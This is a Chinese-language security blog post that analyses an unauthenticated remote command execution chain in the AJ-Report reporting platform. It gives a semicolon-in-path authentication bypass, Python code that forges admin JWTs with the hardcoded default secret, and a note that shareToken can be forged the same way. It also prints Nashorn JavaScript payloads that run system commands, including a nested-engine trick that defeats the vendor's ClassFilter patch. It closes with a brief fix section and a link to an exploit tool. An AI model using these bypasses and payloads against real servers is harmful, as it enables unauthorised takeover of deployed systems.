#### TL;DR

前几天在公众号看到`AJ-Report`未授权远程命令执行，这个洞还挺通杀的。今天看了下命令执行似乎已经修复了，但是这里的`patch`没啥用。而且最关键的鉴权绕过没修，其实鉴权修复了也会有默认`key`导致鉴权绕过的问题。文末给出了利用工具。

#### 漏洞分析

##### 鉴权绕过

这个系统的接口绝大部分都需要登陆，需要绕一下。

鉴权在`TokenFilter`：

![image-20240510135030938](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240510135030938.png)

经典的通过`request.getRequestURI()`拿到`uri`，后面如果`uri`包含`swagger-ui`直接放行。

因为是拿的`URI`，没有参数信息所以没法用`?swagger-ui`绕。

但可以用`;swagger-ui`绕过，因为`parsePathParameters:950, CoyoteAdapter (org.apache.catalina.connector)`这里会取分号作为`pathParamStart`。

![image-20240510154835262](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240510154835262.png)

而`pathParamEnd`这里会取`/`作为结尾。最后截断中间的字符串，也就是说`/a;b/c`最终会解析为`/a/c`

![1715327731929](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715327731929.png)

所以用`/dataSetParam;swagger-ui/verification`就能请求到后端接口了。

![1715327932734](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715327932734.png)

##### 另一处鉴权绕过（默认key）

如果`swagger-ui`放行那里被修复了怎么办呢？可以看到后续会校验`token`。

![1715402625974](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715402625974.png)

校验`token`类也是安吉自己写的，给`jwt payload`加了四个`key-value pairs`。

```java
public String createToken(String username, String uuid, Integer type, String tenantCode) {
    String token = JWT.create().withClaim("username", username).withClaim("uuid", uuid).withClaim("type", type).withClaim("tenant", tenantCode).sign(Algorithm.HMAC256(this.gaeaProperties.getSecurity().getJwtSecret()));
    return token;
}
public String getUsername(String token) {
	Claim claim = (Claim)this.getClaim(token).get("username");
	return claim == null ? null : claim.asString();
}
```

重点来了，通过`this.gaeaProperties.getSecurity().getJwtSecret()`拿到签名密钥。

签名密钥在`GaeaProperties$Security`类中，而`setJwtSecret`方法没有被调用过，因此`key`是默认的。

![image-20240511125152829](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240511125152829.png)

伪造`jwt`即可。

```python
def getFakeToken():
    payload = {
        "type": 0,
        "uuid": "627750b8be86421d94facec7e4dba555",
        "tenant": "tenantCode",
        "username": "admin"
    }
    fakeToken = jwt.encode(payload,'anji_plus_gaea_p@ss1234',algorithm='HS256')
    return fakeToken
```

通过校验。

![1715404334246](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715404334246.png)

光伪造`token`还不够。还有个登陆缓存，缓存逻辑具体可参考`/accessUser/login`路由逻辑。`token`的时效是1小时，如果远程一小时内没有`admin`登录过那么缓存就失效了。

![1715404399333](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715404399333.png)

但是看到这里会校验`shareToken`，如果`reportCodeList.stream().noneMatch(uri::contains)`，也就是`uri`包含`reportCode`的话就返回`false`。而`shareToken`是从`Share-Token`请求头取的。

```java
List<String> reportCodeList = JwtUtil.getReportCodeList(shareToken);
if (!uri.endsWith("/reportDashboard/getData") && !uri.endsWith("/reportExcel/preview") && reportCodeList.stream().noneMatch(uri::contains)) {
	ResponseBean responseBean = ResponseBean.builder().code("50014").message("分享链接已过期").build();
	response.getWriter().print(JSONObject.toJSONString(responseBean));
	return;
}
```

再看一下`shareToken`签名，密钥同样硬编码。

![image-20240511132508126](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240511132508126.png)

伪造完`shareToken`就可以访问接口了。

![1715405171916](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715405171916.png)

##### nashorn引擎执行表达式绕过

漏洞在`\src\main\java\com\anjiplus\template\gaea\business\modules\datasetparam\controller\DataSetParamController.java`中的`/verification`路由，可以看到会调用`verification`方法。

![image-20240510094647181](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240510094647181.png)

跟进`verification`方法，该方法调用了`engine.eval`执行一段表达式。

![image-20240510094951944](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240510094951944.png)

`engine`做了`PATCH`。

![image-20240510095042142](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240510095042142.png)

看下`diff`，加了`ClassFilter`，过滤了命令执行的三个类。

![1715307362768](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715307362768.png)

不太了解这个防御逻辑是啥，先尝试打断点看看是什么逻辑：

![1715307603132](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715307603132.png)

到这里有个`classFilter`。调了个寂寞，还是看看怎么`ban`掉类的逻辑吧。

![1715307815270](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715307815270.png)

先用原版`payload`打一下，简单解释下，流传在网上的`payload`定义了`verification`函数是因为执行完`js`后会调用`js`中的`verification`函数，随后将执行结果返回。`verification`函数就是常规的调用`java.lang.ProcessBuilder('whoami').start()`执行命令。

```js
function verification(data){var se= new javax.script.ScriptEngineManager();var r = new java.lang.ProcessBuilder('whoami').start().getInputStream();result=new java.io.BufferedReader(new java.io.InputStreamReader(r));ss='';while((line = result.readLine()) != null){ss+=line};return ss;}
```

执行失败，提示找不到这个类。

![1715308365531](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715308365531.png)

打异常断点看调用栈：

```java
classNotFound:162, NativeJavaPackage (jdk.nashorn.internal.runtime)
invokeStatic_L_V:-1, 282828951 (java.lang.invoke.LambdaForm$DMH)
reinvoke:-1, 1395859879 (java.lang.invoke.LambdaForm$BMH)
dontInline:-1, 1043162593 (java.lang.invoke.LambdaForm$reinvoker)
guard:-1, 1912131086 (java.lang.invoke.LambdaForm$MH)
linkToCallSite:-1, 23493645 (java.lang.invoke.LambdaForm$MH)
verification:1, Script$Recompilation$4$27A$\^eval\_ (jdk.nashorn.internal.scripts)
invokeStatic_L3_L:-1, 246550802 (java.lang.invoke.LambdaForm$DMH)
invokeExact_MT:-1, 664302677 (java.lang.invoke.LambdaForm$MH)
invoke:639, ScriptFunctionData (jdk.nashorn.internal.runtime)
invoke:494, ScriptFunction (jdk.nashorn.internal.runtime)
apply:393, ScriptRuntime (jdk.nashorn.internal.runtime)
callMember:199, ScriptObjectMirror (jdk.nashorn.api.scripting)
invokeImpl:386, NashornScriptEngine (jdk.nashorn.api.scripting)
invokeFunction:190, NashornScriptEngine (jdk.nashorn.api.scripting)
verification:106, DataSetParamServiceImpl
```

都是匿名函数，感觉不太能`debug`。。

经过一番检索发现此处针对`nashorn`的安全过滤是`JEP202`，还是看文档吧：https://openjdk.org/jeps/202。

```apl
Provide a Java class-access filtering interface, ClassFilter, that can be implemented by Java applications that use Nashorn.
提供一个 Java 类访问过滤接口 ，ClassFilter可以由使用 Nashorn 的 Java 应用程序实现。


Nashorn will query a provided instance of the ClassFilter interface before accessing any Java class from a script in order to determine whether the access is allowed. This will occur whether or not a security manager is present.
Nashorn 将在从脚本访问任何 Java 类之前查询提供的接口实例ClassFilter，以确定是否允许访问。无security manager是否存在，都会发生这种情况。

A script should not be able to subvert restrictions by a class filter in any way, not even by using Java's reflection APIs.
脚本不应该能够以任何方式破坏类过滤器的限制，即使使用 Java 的反射 API 也不行。
```

如果存在类过滤器，即使不存在`security manager`，`Nashorn` 也不让你用反射。如果反射可用那么使用类过滤器就没有意义了，因为可以使用反射来绕过类过滤器。尝试了一下反射确实不行。

不过参考`JEP290`大概猜到`JEP202`也是会过滤类，而不是把命令执行的类阉割了。

所以直接用套娃的方式绕就行，在里面再`new`一个`ScriptEngineManager`，然后再`eval`就行。

```js
function verification(data){var se= new javax.script.ScriptEngineManager();var r = se.getEngineByExtension(\"js\").eval(\"new java.lang.ProcessBuilder('whoami').start().getInputStream();\");result=new java.io.BufferedReader(new java.io.InputStreamReader(r));ss='';while((line = result.readLine()) != null){ss+=line};return ss;}
```

执行命令：

![1715318752312](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1715318752312.png)

##### 别的路由

其实`/dataSet/testTransform`路由也会调用到`engine.eval`，但是没有回显。有兴趣的师傅可以看一下，这个接口的逻辑是执行完表达式发起一个`http`请求，返回的是`http`的`response`。

![image-20240510134204870](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240510134204870.png)

#### 修复

主要问题在鉴权而不是 `engine.eval` ， 应该使用 `reqeust.getServletPath()` 获取 `URI`，或者干脆把 `swagger-ui` 放行逻辑那里删掉。

其次需要修改`jwt`默认密钥。


#### 利用工具

https://github.com/yuebusao/AJ-REPORT-EXPLOIT